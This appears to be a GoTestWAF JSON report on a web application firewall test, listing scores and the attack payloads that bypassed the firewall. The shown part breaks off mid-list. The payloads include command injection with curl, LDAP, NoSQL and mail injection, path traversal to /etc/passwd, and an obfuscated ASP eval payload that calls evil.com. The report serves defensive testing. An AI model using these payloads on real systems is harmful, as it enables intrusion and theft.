@@ -1,0 +1,1536 @@
+{
+    "date": "Wed May  6 19:25:40 2026",
+    "project_name": "generic",
+    "url": "http://localhost:8080",
+    "score": 93.65,
+    "fp": "9a85b1a04fae92196ad6513c8aaa5995",
+    "args": "--url=http://localhost:8080 --reportPath=/Users/carlos/src/barbacana/tests/gotestwaf/reports --reportName=default --reportFormat=pdf,json --noEmailReport --skipWAFBlockCheck --quiet",
+    "summary": {
+        "true_positive_tests": {
+            "score": 84.1,
+            "summary": {
+                "total_sent": 675,
+                "resolved_tests": 673,
+                "blocked_tests": 566,
+                "bypassed_tests": 107,
+                "unresolved_tests": 2,
+                "failed_tests": 0
+            },
+            "api_sec": {
+                "total_sent": 14,
+                "resolved_tests": 12,
+                "blocked_tests": 12,
+                "bypassed_tests": 0,
+                "unresolved_tests": 2,
+                "failed_tests": 0
+            },
+            "app_sec": {
+                "total_sent": 661,
+                "resolved_tests": 661,
+                "blocked_tests": 554,
+                "bypassed_tests": 107,
+                "unresolved_tests": 0,
+                "failed_tests": 0
+            },
+            "test_sets": {
+                "community": {
+                    "community-128kb-rce": {
+                        "percentage": 100,
+                        "sent": 1,
+                        "blocked": 1,
+                        "bypassed": 0,
+                        "unresolved": 0,
+                        "failed": 0
+                    },
+                    "community-128kb-sqli": {
+                        "percentage": 100,
+                        "sent": 1,
+                        "blocked": 1,
+                        "bypassed": 0,
+                        "unresolved": 0,
+                        "failed": 0
+                    },
+                    "community-128kb-xss": {
+                        "percentage": 100,
+                        "sent": 1,
+                        "blocked": 1,
+                        "bypassed": 0,
+                        "unresolved": 0,
+                        "failed": 0
+                    },
+                    "community-16kb-rce": {
+                        "percentage": 100,
+                        "sent": 1,
+                        "blocked": 1,
+                        "bypassed": 0,
+                        "unresolved": 0,
+                        "failed": 0
+                    },
+                    "community-16kb-sqli": {
+                        "percentage": 100,
+                        "sent": 1,
+                        "blocked": 1,
+                        "bypassed": 0,
+                        "unresolved": 0,
+                        "failed": 0
+                    },
+                    "community-16kb-xss": {
+                        "percentage": 100,
+                        "sent": 1,
+                        "blocked": 1,
+                        "bypassed": 0,
+                        "unresolved": 0,
+                        "failed": 0
+                    },
+                    "community-32kb-rce": {
+                        "percentage": 100,
+                        "sent": 1,
+                        "blocked": 1,
+                        "bypassed": 0,
+                        "unresolved": 0,
+                        "failed": 0
+                    },
+                    "community-32kb-sqli": {
+                        "percentage": 100,
+                        "sent": 1,
+                        "blocked": 1,
+                        "bypassed": 0,
+                        "unresolved": 0,
+                        "failed": 0
+                    },
+                    "community-32kb-xss": {
+                        "percentage": 100,
+                        "sent": 1,
+                        "blocked": 1,
+                        "bypassed": 0,
+                        "unresolved": 0,
+                        "failed": 0
+                    },
+                    "community-64kb-rce": {
+                        "percentage": 100,
+                        "sent": 1,
+                        "blocked": 1,
+                        "bypassed": 0,
+                        "unresolved": 0,
+                        "failed": 0
+                    },
+                    "community-64kb-sqli": {
+                        "percentage": 100,
+                        "sent": 1,
+                        "blocked": 1,
+                        "bypassed": 0,
+                        "unresolved": 0,
+                        "failed": 0
+                    },
+                    "community-64kb-xss": {
+                        "percentage": 100,
+                        "sent": 1,
+                        "blocked": 1,
+                        "bypassed": 0,
+                        "unresolved": 0,
+                        "failed": 0
+                    },
+                    "community-8kb-rce": {
+                        "percentage": 100,
+                        "sent": 1,
+                        "blocked": 1,
+                        "bypassed": 0,
+                        "unresolved": 0,
+                        "failed": 0
+                    },
+                    "community-8kb-sqli": {
+                        "percentage": 100,
+                        "sent": 1,
+                        "blocked": 1,
+                        "bypassed": 0,
+                        "unresolved": 0,
+                        "failed": 0
+                    },
+                    "community-8kb-xss": {
+                        "percentage": 100,
+                        "sent": 1,
+                        "blocked": 1,
+                        "bypassed": 0,
+                        "unresolved": 0,
+                        "failed": 0
+                    },
+                    "community-lfi": {
+                        "percentage": 100,
+                        "sent": 8,
+                        "blocked": 8,
+                        "bypassed": 0,
+                        "unresolved": 0,
+                        "failed": 0
+                    },
+                    "community-lfi-multipart": {
+                        "percentage": 100,
+                        "sent": 2,
+                        "blocked": 2,
+                        "bypassed": 0,
+                        "unresolved": 0,
+                        "failed": 0
+                    },
+                    "community-rce": {
+                        "percentage": 75,
+                        "sent": 4,
+                        "blocked": 3,
+                        "bypassed": 1,
+                        "unresolved": 0,
+                        "failed": 0
+                    },
+                    "community-rce-rawrequests": {
+                        "percentage": 100,
+                        "sent": 3,
+                        "blocked": 3,
+                        "bypassed": 0,
+                        "unresolved": 0,
+                        "failed": 0
+                    },
+                    "community-sqli": {
+                        "percentage": 100,
+                        "sent": 12,
+                        "blocked": 12,
+                        "bypassed": 0,
+                        "unresolved": 0,
+                        "failed": 0
+                    },
+                    "community-user-agent": {
+                        "percentage": 66.67,
+                        "sent": 9,
+                        "blocked": 6,
+                        "bypassed": 3,
+                        "unresolved": 0,
+                        "failed": 0
+                    },
+                    "community-xss": {
+                        "percentage": 98.08,
+                        "sent": 104,
+                        "blocked": 102,
+                        "bypassed": 2,
+                        "unresolved": 0,
+                        "failed": 0
+                    },
+                    "community-xxe": {
+                        "percentage": 100,
+                        "sent": 2,
+                        "blocked": 2,
+                        "bypassed": 0,
+                        "unresolved": 0,
+                        "failed": 0
+                    }
+                },
+                "owasp": {
+                    "crlf": {
+                        "percentage": 85.71,
+                        "sent": 7,
+                        "blocked": 6,
+                        "bypassed": 1,
+                        "unresolved": 0,
+                        "failed": 0
+                    },
+                    "ldap-injection": {
+                        "percentage": 33.33,
+                        "sent": 24,
+                        "blocked": 8,
+                        "bypassed": 16,
+                        "unresolved": 0,
+                        "failed": 0
+                    },
+                    "mail-injection": {
+                        "percentage": 66.67,
+                        "sent": 24,
+                        "blocked": 16,
+                        "bypassed": 8,
+                        "unresolved": 0,
+                        "failed": 0
+                    },
+                    "nosql-injection": {
+                        "percentage": 62,
+                        "sent": 50,
+                        "blocked": 31,
+                        "bypassed": 19,
+                        "unresolved": 0,
+                        "failed": 0
+                    },
+                    "path-traversal": {
+                        "percentage": 60,
+                        "sent": 20,
+                        "blocked": 12,
+                        "bypassed": 8,
+                        "unresolved": 0,
+                        "failed": 0
+                    },
+                    "rce": {
+                        "percentage": 50,
+                        "sent": 6,
+                        "blocked": 3,
+                        "bypassed": 3,
+                        "unresolved": 0,
+                        "failed": 0
+                    },
+                    "rce-urlparam": {
+                        "percentage": 33.33,
+                        "sent": 9,
+                        "blocked": 3,
+                        "bypassed": 6,
+                        "unresolved": 0,
+                        "failed": 0
+                    },
+                    "rce-urlpath": {
+                        "percentage": 0,
+                        "sent": 3,
+                        "blocked": 0,
+                        "bypassed": 3,
+                        "unresolved": 0,
+                        "failed": 0
+                    },
+                    "shell-injection": {
+                        "percentage": 59.38,
+                        "sent": 32,
+                        "blocked": 19,
+                        "bypassed": 13,
+                        "unresolved": 0,
+                        "failed": 0
+                    },
+                    "sql-injection": {
+                        "percentage": 81.25,
+                        "sent": 48,
+                        "blocked": 39,
+                        "bypassed": 9,
+                        "unresolved": 0,
+                        "failed": 0
+                    },
+                    "ss-include": {
+                        "percentage": 100,
+                        "sent": 24,
+                        "blocked": 24,
+                        "bypassed": 0,
+                        "unresolved": 0,
+                        "failed": 0
+                    },
+                    "sst-injection": {
+                        "percentage": 58.33,
+                        "sent": 24,
+                        "blocked": 14,
+                        "bypassed": 10,
+                        "unresolved": 0,
+                        "failed": 0
+                    },
+                    "xml-injection": {
+                        "percentage": 100,
+                        "sent": 7,
+                        "blocked": 7,
+                        "bypassed": 0,
+                        "unresolved": 0,
+                        "failed": 0
+                    },
+                    "xss-scripting": {
+                        "percentage": 97.77,
+                        "sent": 224,
+                        "blocked": 219,
+                        "bypassed": 5,
+                        "unresolved": 0,
+                        "failed": 0
+                    }
+                },
+                "owasp-api": {
+                    "graphql": {
+                        "percentage": 0,
+                        "sent": 0,
+                        "blocked": 0,
+                        "bypassed": 0,
+                        "unresolved": 0,
+                        "failed": 0
+                    },
+                    "graphql-post": {
+                        "percentage": 0,
+                        "sent": 0,
+                        "blocked": 0,
+                        "bypassed": 0,
+                        "unresolved": 0,
+                        "failed": 0
+                    },
+                    "grpc": {
+                        "percentage": 0,
+                        "sent": 0,
+                        "blocked": 0,
+                        "bypassed": 0,
+                        "unresolved": 0,
+                        "failed": 0
+                    },
+                    "non-crud": {
+                        "percentage": 0,
+                        "sent": 2,
+                        "blocked": 0,
+                        "bypassed": 0,
+                        "unresolved": 2,
+                        "failed": 0
+                    },
+                    "rest": {
+                        "percentage": 100,
+                        "sent": 7,
+                        "blocked": 7,
+                        "bypassed": 0,
+                        "unresolved": 0,
+                        "failed": 0
+                    },
+                    "soap": {
+                        "percentage": 100,
+                        "sent": 5,
+                        "blocked": 5,
+                        "bypassed": 0,
+                        "unresolved": 0,
+                        "failed": 0
+                    }
+                }
+            }
+        },
+        "true_negative_tests": {
+            "score": 90.78,
+            "summary": {
+                "total_sent": 141,
+                "resolved_tests": 141,
+                "blocked_tests": 13,
+                "bypassed_tests": 128,
+                "unresolved_tests": 0,
+                "failed_tests": 0
+            },
+            "api_sec": {
+                "total_sent": 0,
+                "resolved_tests": 0,
+                "blocked_tests": 0,
+                "bypassed_tests": 0,
+                "unresolved_tests": 0,
+                "failed_tests": 0
+            },
+            "app_sec": {
+                "total_sent": 141,
+                "resolved_tests": 141,
+                "blocked_tests": 13,
+                "bypassed_tests": 128,
+                "unresolved_tests": 0,
+                "failed_tests": 0
+            },
+            "test_sets": {
+                "false-pos": {
+                    "texts": {
+                        "percentage": 90.78,
+                        "sent": 141,
+                        "blocked": 13,
+                        "bypassed": 128,
+                        "unresolved": 0,
+                        "failed": 0
+                    }
+                }
+            }
+        }
+    },
+    "true_positive_tests_payloads": {
+        "bypassed": [
+            {
+                "payload": "`curl -L http://ⒼⓄⓄⒼⓁⒺ.ⒸⓄⓂ`",
+                "test_set": "community",
+                "test_case": "community-rce",
+                "encoder": "URL",
+                "placeholder": "URL",
+                "status": 200,
+                "test_result": "failed"
+            },
+            {
+                "payload": "http://lmb1ikpej3yys0gqft8lxewm2d89w5qtgh840sp.burpcollaborator.net/6.17.0.RELEASE iPhone12,8 iOS/14.5.1))",
+                "test_set": "community",
+                "test_case": "community-user-agent",
+                "encoder": "Plain",
+                "placeholder": "Plain",
+                "status": 200,
+                "test_result": "failed"
+            },
+            {
+                "payload": "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36 root@w63gecoroprj5um8ypnd7r6in9t0hseg3.interact.sh",
+                "test_set": "community",
+                "test_case": "community-user-agent",
+                "encoder": "Plain",
+                "placeholder": "Plain",
+                "status": 200,
+                "test_result": "failed"
+            },
+            {
+                "payload": "mercuryboard_user_agent_sql_injection.nasl'",
+                "test_set": "community",
+                "test_case": "community-user-agent",
+                "encoder": "Plain",
+                "placeholder": "Plain",
+                "status": 200,
+                "test_result": "failed"
+            },
+            {
+                "payload": "\u0026gt;+src+onerror=confirm\u0026amp;lpar;1\u0026amp;rpar;\u0026lt;",
+                "test_set": "community",
+                "test_case": "community-xss",
+                "encoder": "URL",
+                "placeholder": "URL",
+                "status": 200,
+                "test_result": "failed"
+            },
+            {
+                "payload": "\u0026gt;+src+onerror=confirm\u0026amp;lpar;1\u0026amp;rpar;\u0026lt;",
+                "test_set": "community",
+                "test_case": "community-xss",
+                "encoder": "URL",
+                "placeholder": "URL",
+                "status": 200,
+                "test_result": "failed"
+            },
+            {
+                "payload": "%e5%98%8dSet-cookie%3acrlf%3dinjection",
+                "test_set": "owasp",
+                "test_case": "crlf",
+                "encoder": "Plain",
+                "placeholder": "Plain",
+                "status": 200,
+                "test_result": "failed"
+            },
+            {
+                "payload": "(\u0026(uid=admin)(!(\u0026(1=0)(userPassword=q))))",
+                "test_set": "owasp",
+                "test_case": "ldap-injection",
+                "encoder": "Base64Flat",
+                "placeholder": "Base64Flat",
+                "status": 200,
+                "test_result": "failed"
+            },
+            {
+                "payload": "(\u0026(uid=admin)(!(\u0026(1=0)(userPassword=q))))",
+                "test_set": "owasp",
+                "test_case": "ldap-injection",
+                "encoder": "Base64Flat",
+                "placeholder": "Base64Flat",
+                "status": 200,
+                "test_result": "failed"
+            },
+            {
+                "payload": "(\u0026(uid=admin)(!(\u0026(1=0)(userPassword=q))))",
+                "test_set": "owasp",
+                "test_case": "ldap-injection",
+                "encoder": "Base64Flat",
+                "placeholder": "Base64Flat",
+                "status": 200,
+                "test_result": "failed"
+            },
+            {
+                "payload": "(\u0026(uid=admin)(!(\u0026(1=0)(userPassword=q))))",
+                "test_set": "owasp",
+                "test_case": "ldap-injection",
+                "encoder": "URL",
+                "placeholder": "URL",
+                "status": 200,
+                "test_result": "failed"
+            },
+            {
+                "payload": "*(|(objectclass=*))",
+                "test_set": "owasp",
+                "test_case": "ldap-injection",
+                "encoder": "Base64Flat",
+                "placeholder": "Base64Flat",
+                "status": 200,
+                "test_result": "failed"
+            },
+            {
+                "payload": "*(|(objectclass=*))",
+                "test_set": "owasp",
+                "test_case": "ldap-injection",
+                "encoder": "Base64Flat",
+                "placeholder": "Base64Flat",
+                "status": 200,
+                "test_result": "failed"
+            },
+            {
+                "payload": "*(|(objectclass=*))",
+                "test_set": "owasp",
+                "test_case": "ldap-injection",
+                "encoder": "Base64Flat",
+                "placeholder": "Base64Flat",
+                "status": 200,
+                "test_result": "failed"
+            },
+            {
+                "payload": "*(|(objectclass=*))",
+                "test_set": "owasp",
+                "test_case": "ldap-injection",
+                "encoder": "URL",
+                "placeholder": "URL",
+                "status": 200,
+                "test_result": "failed"
+            },
+            {
+                "payload": "*(|(objectclass=*))",
+                "test_set": "owasp",
+                "test_case": "ldap-injection",
+                "encoder": "URL",
+                "placeholder": "URL",
+                "status": 200,
+                "test_result": "failed"
+            },
+            {
+                "payload": "*(|(objectclass=*))",
+                "test_set": "owasp",
+                "test_case": "ldap-injection",
+                "encoder": "URL",
+                "placeholder": "URL",
+                "status": 200,
+                "test_result": "failed"
+            },
+            {
+                "payload": "userPassword:2.5.13.18:=123",
+                "test_set": "owasp",
+                "test_case": "ldap-injection",
+                "encoder": "Base64Flat",
+                "placeholder": "Base64Flat",
+                "status": 200,
+                "test_result": "failed"
+            },
+            {
+                "payload": "userPassword:2.5.13.18:=123",
+                "test_set": "owasp",
+                "test_case": "ldap-injection",
+                "encoder": "Base64Flat",
+                "placeholder": "Base64Flat",
+                "status": 200,
+                "test_result": "failed"
+            },
+            {
+                "payload": "userPassword:2.5.13.18:=123",
+                "test_set": "owasp",
+                "test_case": "ldap-injection",
+                "encoder": "Base64Flat",
+                "placeholder": "Base64Flat",
+                "status": 200,
+                "test_result": "failed"
+            },
+            {
+                "payload": "userPassword:2.5.13.18:=123",
+                "test_set": "owasp",
+                "test_case": "ldap-injection",
+                "encoder": "URL",
+                "placeholder": "URL",
+                "status": 200,
+                "test_result": "failed"
+            },
+            {
+                "payload": "userPassword:2.5.13.18:=123",
+                "test_set": "owasp",
+                "test_case": "ldap-injection",
+                "encoder": "URL",
+                "placeholder": "URL",
+                "status": 200,
+                "test_result": "failed"
+            },
+            {
+                "payload": "userPassword:2.5.13.18:=123",
+                "test_set": "owasp",
+                "test_case": "ldap-injection",
+                "encoder": "URL",
+                "placeholder": "URL",
+                "status": 200,
+                "test_result": "failed"
+            },
+            {
+                "payload": "\r\nV100 CAPABILITY\r\nV101 FETCH 4791",
+                "test_set": "owasp",
+                "test_case": "mail-injection",
+                "encoder": "URL",
+                "placeholder": "URL",
+                "status": 200,
+                "test_result": "failed"
+            },
+            {
+                "payload": "\r\nQUIT\r\n",
+                "test_set": "owasp",
+                "test_case": "mail-injection",
+                "encoder": "URL",
+                "placeholder": "URL",
+                "status": 200,
+                "test_result": "failed"
+            },
+            {
+                "payload": "\nRCPT TO: test@evil.com\n",
+                "test_set": "owasp",
+                "test_case": "mail-injection",
+                "encoder": "Base64Flat",
+                "placeholder": "Base64Flat",
+                "status": 200,
+                "test_result": "failed"
+            },
+            {
+                "payload": "\nRCPT TO: test@evil.com\n",
+                "test_set": "owasp",
+                "test_case": "mail-injection",
+                "encoder": "Base64Flat",
+                "placeholder": "Base64Flat",
+                "status": 200,
+                "test_result": "failed"
+            },
+            {
+                "payload": "\nRCPT TO: test@evil.com\n",
+                "test_set": "owasp",
+                "test_case": "mail-injection",
+                "encoder": "Base64Flat",
+                "placeholder": "Base64Flat",
+                "status": 200,
+                "test_result": "failed"
+            },
+            {
+                "payload": "\nRCPT TO: test@evil.com\n",
+                "test_set": "owasp",
+                "test_case": "mail-injection",
+                "encoder": "Base64Flat",
+                "placeholder": "Base64Flat",
+                "status": 200,
+                "test_result": "failed"
+            },
+            {
+                "payload": "\nRCPT TO: test@evil.com\n",
+                "test_set": "owasp",
+                "test_case": "mail-injection",
+                "encoder": "URL",
+                "placeholder": "URL",
+                "status": 200,
+                "test_result": "failed"
+            },
+            {
+                "payload": "\nRCPT TO: test@evil.com\n",
+                "test_set": "owasp",
+                "test_case": "mail-injection",
+                "encoder": "URL",
+                "placeholder": "URL",
+                "status": 200,
+                "test_result": "failed"
+            },
+            {
+                "payload": "db.injection.insert({success:1});",
+                "test_set": "owasp",
+                "test_case": "nosql-injection",
+                "encoder": "URL",
+                "placeholder": "URL",
+                "status": 200,
+                "test_result": "failed"
+            },
+            {
+                "payload": "true, $where: '99 == 88'",
+                "test_set": "owasp",
+                "test_case": "nosql-injection",
+                "encoder": "URL",
+                "placeholder": "URL",
+                "status": 200,
+                "test_result": "failed"
+            },
+            {
+                "payload": "', $or: [ {}, { 'order':'order",
+                "test_set": "owasp",
+                "test_case": "nosql-injection",
+                "encoder": "URL",
+                "placeholder": "URL",
+                "status": 200,
+                "test_result": "failed"
+            },
+            {
+                "payload": ";var date = new Date(); do{curDate = new Date();}while(curDate-date",
+                "test_set": "owasp",
+                "test_case": "nosql-injection",
+                "encoder": "Base64Flat",
+                "placeholder": "Base64Flat",
+                "status": 200,
+                "test_result": "failed"
+            },
+            {
+                "payload": ";var date = new Date(); do{curDate = new Date();}while(curDate-date",
+                "test_set": "owasp",
+                "test_case": "nosql-injection",
+                "encoder": "Base64Flat",
+                "placeholder": "Base64Flat",
+                "status": 200,
+                "test_result": "failed"
+            },
+            {
+                "payload": ";var date = new Date(); do{curDate = new Date();}while(curDate-date",
+                "test_set": "owasp",
+                "test_case": "nosql-injection",
+                "encoder": "Base64Flat",
+                "placeholder": "Base64Flat",
+                "status": 200,
+                "test_result": "failed"
+            },
+            {
+                "payload": ";var date = new Date(); do{curDate = new Date();}while(curDate-date",
+                "test_set": "owasp",
+                "test_case": "nosql-injection",
+                "encoder": "Base64Flat",
+                "placeholder": "Base64Flat",
+                "status": 200,
+                "test_result": "failed"
+            },
+            {
+                "payload": ";var date = new Date(); do{curDate = new Date();}while(curDate-date",
+                "test_set": "owasp",
+                "test_case": "nosql-injection",
+                "encoder": "URL",
+                "placeholder": "URL",
+                "status": 200,
+                "test_result": "failed"
+            },
+            {
+                "payload": ";var date = new Date(); do{curDate = new Date();}while(curDate-date",
+                "test_set": "owasp",
+                "test_case": "nosql-injection",
+                "encoder": "URL",
+                "placeholder": "URL",
+                "status": 200,
+                "test_result": "failed"
+            },
+            {
+                "payload": ";var date = new Date(); do{curDate = new Date();}while(curDate-date",
+                "test_set": "owasp",
+                "test_case": "nosql-injection",
+                "encoder": "URL",
+                "placeholder": "URL",
+                "status": 200,
+                "test_result": "failed"
+            },
+            {
+                "payload": "0;var date=new Date(); do{curDate = new Date();}while(curDate-date\u003c10000)",
+                "test_set": "owasp",
+                "test_case": "nosql-injection",
+                "encoder": "Base64Flat",
+                "placeholder": "Base64Flat",
+                "status": 200,
+                "test_result": "failed"
+            },
+            {
+                "payload": "0;var date=new Date(); do{curDate = new Date();}while(curDate-date\u003c10000)",
+                "test_set": "owasp",
+                "test_case": "nosql-injection",
+                "encoder": "Base64Flat",
+                "placeholder": "Base64Flat",
+                "status": 200,
+                "test_result": "failed"
+            },
+            {
+                "payload": ";var date = new Date(); do{curDate = new Date();}while(curDate-date",
+                "test_set": "owasp",
+                "test_case": "nosql-injection",
+                "encoder": "URL",
+                "placeholder": "URL",
+                "status": 200,
+                "test_result": "failed"
+            },
+            {
+                "payload": "0;var date=new Date(); do{curDate = new Date();}while(curDate-date\u003c10000)",
+                "test_set": "owasp",
+                "test_case": "nosql-injection",
+                "encoder": "Base64Flat",
+                "placeholder": "Base64Flat",
+                "status": 200,
+                "test_result": "failed"
+            },
+            {
+                "payload": "0;var date=new Date(); do{curDate = new Date();}while(curDate-date\u003c10000)",
+                "test_set": "owasp",
+                "test_case": "nosql-injection",
+                "encoder": "URL",
+                "placeholder": "URL",
+                "status": 200,
+                "test_result": "failed"
+            },
+            {
+                "payload": "0;var date=new Date(); do{curDate = new Date();}while(curDate-date\u003c10000)",
+                "test_set": "owasp",
+                "test_case": "nosql-injection",
+                "encoder": "URL",
+                "placeholder": "URL",
+                "status": 200,
+                "test_result": "failed"
+            },
+            {
+                "payload": "0;var date=new Date(); do{curDate = new Date();}while(curDate-date\u003c10000)",
+                "test_set": "owasp",
+                "test_case": "nosql-injection",
+                "encoder": "Base64Flat",
+                "placeholder": "Base64Flat",
+                "status": 200,
+                "test_result": "failed"
+            },
+            {
+                "payload": "0;var date=new Date(); do{curDate = new Date();}while(curDate-date\u003c10000)",
+                "test_set": "owasp",
+                "test_case": "nosql-injection",
+                "encoder": "URL",
+                "placeholder": "URL",
+                "status": 200,
+                "test_result": "failed"
+            },
+            {
+                "payload": "0;var date=new Date(); do{curDate = new Date();}while(curDate-date\u003c10000)",
+                "test_set": "owasp",
+                "test_case": "nosql-injection",
+                "encoder": "URL",
+                "placeholder": "URL",
+                "status": 200,
+                "test_result": "failed"
+            },
+            {
+                "payload": "/static/img/../../etc/passwd",
+                "test_set": "owasp",
+                "test_case": "path-traversal",
+                "encoder": "URL",
+                "placeholder": "URL",
+                "status": 200,
+                "test_result": "failed"
+            },
+            {
+                "payload": "\\\\::1\\c$\\users\\default\\ntuser.dat",
+                "test_set": "owasp",
+                "test_case": "path-traversal",
+                "encoder": "Base64Flat",
+                "placeholder": "Base64Flat",
+                "status": 200,
+                "test_result": "failed"
+            },
+            {
+                "payload": "\\\\::1\\c$\\users\\default\\ntuser.dat",
+                "test_set": "owasp",
+                "test_case": "path-traversal",
+                "encoder": "Base64Flat",
+                "placeholder": "Base64Flat",
+                "status": 200,
+                "test_result": "failed"
+            },
+            {
+                "payload": "\\\\::1\\c$\\users\\default\\ntuser.dat",
+                "test_set": "owasp",
+                "test_case": "path-traversal",
+                "encoder": "Base64Flat",
+                "placeholder": "Base64Flat",
+                "status": 200,
+                "test_result": "failed"
+            },
+            {
+                "payload": "\\\\::1\\c$\\users\\default\\ntuser.dat",
+                "test_set": "owasp",
+                "test_case": "path-traversal",
+                "encoder": "Base64Flat",
+                "placeholder": "Base64Flat",
+                "status": 200,
+                "test_result": "failed"
+            },
+            {
+                "payload": "\\\\::1\\c$\\users\\default\\ntuser.dat",
+                "test_set": "owasp",
+                "test_case": "path-traversal",
+                "encoder": "URL",
+                "placeholder": "URL",
+                "status": 200,
+                "test_result": "failed"
+            },
+            {
+                "payload": "\\\\::1\\c$\\users\\default\\ntuser.dat",
+                "test_set": "owasp",
+                "test_case": "path-traversal",
+                "encoder": "URL",
+                "placeholder": "URL",
+                "status": 200,
+                "test_result": "failed"
+            },
+            {
+                "payload": "\\\\::1\\c$\\users\\default\\ntuser.dat",
+                "test_set": "owasp",
+                "test_case": "path-traversal",
+                "encoder": "URL",
+                "placeholder": "URL",
+                "status": 200,
+                "test_result": "failed"
+            },
+            {
+                "payload": "Ev al (\"Ex\"\u0026\"e\"\u0026\"cute(\"\"Server.ScriptTimeout=3600:On Error Resume Next:Function bd(byVal s):For i=1 To Len(s) Step 2:c=M\"\u0026\"i\"\u0026\"d(s,i,2):If IsNumeric(M\"\u0026\"i\"\u0026\"d(s,i,1)) Then:Ex\"\u0026\"e\"\u0026\"cute(\"\"\"\"bd=bd\u0026c\"\u0026\"h\"\u0026\"r(\u0026H\"\"\"\"\u0026c\u0026\"\"\"\")\"\"\"\"):Else:Ex\"\u0026\"e\"\u0026\"cute(\"\"\"\"bd=bd\u0026c\"\u0026\"h\"\u0026\"r(\u0026H\"\"\"\"\u0026c\u0026M\"\u0026\"i\"\u0026\"d(s,i 2,2)\u0026\"\"\"\")\"\"\"\"):i=i 2:End If\"\"\u0026c\"\u0026\"h\"\u0026\"r(10)\u0026\"\"Next:End Function:Response.Write(\"\"\"\"@*lxl*@\"\"\"\"):Ex\"\u0026\"e\"\u0026\"cute(\"\"\"\"On Error Resume Next:\"\"\"\"\u0026bd(\"\"\"\"44696d20686d3a536574206f626a584d4c3d5365727665722e4372656174654f626a65637428224d53584d4c322e536572766572584d4c4854545022293a6f626a584d4c2e6f70656e2022474554222c22687474703a2f2f6576696c2e636f6d2f6170692e7068703f6b65793d7c786c736c31736b733832646a6173647564736178787878222c66616c73653a6f626a584d4c2e73656e6428293a686d3d6f626a584d4c2e726573706f6e7365546578743a496620686d3c3e224f4b22205468656e3a526573706f6e73652e57726974652822454e4422293a456e642049663a526573706f6e73652e577269746528224c584c2229\"\"\"\")):Response.Write(\"\"\"\"*@lxl@*\"\"\"\"):Response.End\"\")\")",
+                "test_set": "owasp",
+                "test_case": "rce-urlparam",
+                "encoder": "URL",
+                "placeholder": "URL",
+                "status": 200,
+                "test_result": "failed"
+            },
+            {
+                "payload": "Ev al (\"Ex\"\u0026\"e\"\u0026\"cute(\"\"Server.ScriptTimeout=3600:On Error Resume Next:Function bd(byVal s):For i=1 To Len(s) Step 2:c=M\"\u0026\"i\"\u0026\"d(s,i,2):If IsNumeric(M\"\u0026\"i\"\u0026\"d(s,i,1)) Then:Ex\"\u0026\"e\"\u0026\"cute(\"\"\"\"bd=bd\u0026c\"\u0026\"h\"\u0026\"r(\u0026H\"\"\"\"\u0026c\u0026\"\"\"\")\"\"\"\"):Else:Ex\"\u0026\"e\"\u0026\"cute(\"\"\"\"bd=bd\u0026c\"\u0026\"h\"\u0026\"r(\u0026H\"\"\"\"\u0026c\u0026M\"\u0026\"i\"\u0026\"d(s,i 2,2)\u0026\"\"\"\")\"\"\"\"):i=i 2:End If\"\"\u0026c\"\u0026\"h\"\u0026\"r(10)\u0026\"\"Next:End Function:Response.Write(\"\"\"\"@*lxl*@\"\"\"\"):Ex\"\u0026\"e\"\u0026\"cute(\"\"\"\"On Error Resume Next:\"\"\"\"\u0026bd(\"\"\"\"44696d20686d3a536574206f626a584d4c3d5365727665722e4372656174654f626a65637428224d53584d4c322e536572766572584d4c4854545022293a6f626a584d4c2e6f70656e2022474554222c22687474703a2f2f6576696c2e636f6d2f6170692e7068703f6b65793d7c786c736c31736b733832646a6173647564736178787878222c66616c73653a6f626a584d4c2e73656e6428293a686d3d6f626a584d4c2e726573706f6e7365546578743a496620686d3c3e224f4b22205468656e3a526573706f6e73652e57726974652822454e4422293a456e642049663a526573706f6e73652e577269746528224c584c2229\"\"\"\")):Response.Write(\"\"\"\"*@lxl@*\"\"\"\"):Response.End\"\")\")",
+                "test_set": "owasp",
+                "test_case": "rce-urlparam",
+                "encoder": "URL",
+                "placeholder": "URL",
+                "status": 200,
+                "test_result": "failed"
+            },
+            {
+                "payload": "Ev al (\"Ex\"\u0026\"e\"\u0026\"cute(\"\"Server.ScriptTimeout=3600:On Error Resume Next:Function bd(byVal s):For i=1 To Len(s) Step 2:c=M\"\u0026\"i\"\u0026\"d(s,i,2):If IsNumeric(M\"\u0026\"i\"\u0026\"d(s,i,1)) Then:Ex\"\u0026\"e\"\u0026\"cute(\"\"\"\"bd=bd\u0026c\"\u0026\"h\"\u0026\"r(\u0026H\"\"\"\"\u0026c\u0026\"\"\"\")\"\"\"\"):Else:Ex\"\u0026\"e\"\u0026\"cute(\"\"\"\"bd=bd\u0026c\"\u0026\"h\"\u0026\"r(\u0026H\"\"\"\"\u0026c\u0026M\"\u0026\"i\"\u0026\"d(s,i 2,2)\u0026\"\"\"\")\"\"\"\"):i=i 2:End If\"\"\u0026c\"\u0026\"h\"\u0026\"r(10)\u0026\"\"Next:End Function:Response.Write(\"\"\"\"@*lxl*@\"\"\"\"):Ex\"\u0026\"e\"\u0026\"cute(\"\"\"\"On Error Resume Next:\"\"\"\"\u0026bd(\"\"\"\"44696d20686d3a536574206f626a584d4c3d5365727665722e4372656174654f626a65637428224d53584d4c322e536572766572584d4c4854545022293a6f626a584d4c2e6f70656e2022474554222c22687474703a2f2f6576696c2e636f6d2f6170692e7068703f6b65793d7c786c736c31736b733832646a6173647564736178787878222c66616c73653a6f626a584d4c2e73656e6428293a686d3d6f626a584d4c2e726573706f6e7365546578743a496620686d3c3e224f4b22205468656e3a526573706f6e73652e57726974652822454e4422293a456e642049663a526573706f6e73652e577269746528224c584c2229\"\"\"\")):Response.Write(\"\"\"\"*@lxl@*\"\"\"\"):Response.End\"\")\")",
+                "test_set": "owasp",
+                "test_case": "rce-urlparam",
+                "encoder": "URL",
+                "placeholder": "URL",
+                "status": 200,
+                "test_result": "failed"
+            },
+            {
+                "payload": "!!python/object/new:exec [import socket; socket.gethostbyname('somehost.burpcollaborator.net')]",
+                "test_set": "owasp",
+                "test_case": "rce-urlparam",
+                "encoder": "URL",
+                "placeholder": "URL",
+                "status": 200,
+                "test_result": "failed"
+            },
+            {
+                "payload": "!!python/object/new:exec [import socket; socket.gethostbyname('somehost.burpcollaborator.net')]",
+                "test_set": "owasp",
+                "test_case": "rce-urlparam",
+                "encoder": "URL",
+                "placeholder": "URL",
+                "status": 200,
+                "test_result": "failed"
+            },
+            {
